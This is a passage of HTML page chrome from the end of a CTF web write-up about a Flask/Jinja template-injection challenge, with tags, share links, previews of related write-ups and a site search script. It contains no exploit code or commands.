            class="post-tag no-text-decoration"
          >python-scripting</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=Pragyan%20-%20Deathday%20Card%20-%20NullBrunk&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fpragyan-deathdaycard%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Pragyan%20-%20Deathday%20Card%20-%20NullBrunk&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fpragyan-deathdaycard%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fpragyan-deathdaycard%2F&text=Pragyan%20-%20Deathday%20Card%20-%20NullBrunk" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>

            
          </main>

         
            <!-- panel -->
            <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
              <div class="access">
                

  <section id="toc-wrapper">
    <h2 class="panel-heading no-border">Event</h2>
    <ul class="content list-unstyled no-border ps-0 pb-1 ms-1 mt-2 toc-list ">
    
      <li class="toc-list-item">
        <a class="toc-link node-name--H2 img-link fw-600 blue-sidebar"> <i class="fa-solid fa-ranking-star mr-11-px"></i> 10 / 445  </a>
      </li>

      <li class="toc-list-item no-border">
        <a class="toc-link node-name--H2 img-link fw-600" href="https://ctftime.org/event/2608" target="_blank"> <i class="fa-solid fa-link mr-11-px"></i>Link</a>
      </li>

    </ul>
  </section>





                

  <section>
      <h2 class="panel-heading no-border">Tags</h2>

      <nav id="toc">
        <div class="d-flex flex-wrap mt-3 mb-1 me-3">
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/writeups/">writeups</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/web/">web</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/ssti/">ssti</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/flask/">flask</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/jinja/">jinja</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/python-scripting/">python-scripting</a>
          
        </div>
      </nav>
  </section>


              </div>

              
                
                






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-1 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>

              
            </aside>
          
        </div>

        <div class="row">
          <!-- tail -->

          
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    










  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/hackday-2025-finest/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1737806400"
  data-df="ll"
  
>
  Jan 25, 2025
</time>

              <h4 class="pt-0 my-2">HackDay - Finest</h4>
              <div class="text-muted">
                <p>Introduction
    
      Description
    
  
  Enumeration
    
      Reading Source Code
      JWY Secret Key
      SQL injection
    
  
  Exploitation
    
      Understanding the JWT
      Scrip...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/knightctf-2025-baby-injection/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1737388800"
  data-df="ll"
  
>
  Jan 20, 2025
</time>

              <h4 class="pt-0 my-2">KnightCTF - Baby Injection</h4>
              <div class="text-muted">
                <p>Enumeration
    
      Enumerating website
    
  
  Exploitation
    
      Getting RCE
      Getting flag
    
  




Enumeration

Enumerating website
Let’s start by accessing the index page:

We...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/SrdnlenCTF2025-racecondition-copy/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1737216000"
  data-df="ll"
  
>
  Jan 18, 2025
</time>

              <h4 class="pt-0 my-2">Srdnlen - Speed</h4>
              <div class="text-muted">
                <p>Enumeration
    
      Reading source code
      Interesting points
      Identifying vulnerabilities
    
  
  Exploitation
    
      Exploiting the vulnerability
      Scripting
      Getting th...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      

  <section>
      <h2 class="panel-heading no-border">Tags</h2>

      <nav id="toc">
        <div class="d-flex flex-wrap mt-3 mb-1 me-3">
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/hacking-tools/">hacking-tools</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/poc/">poc</a>
          
        </div>
      </nav>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

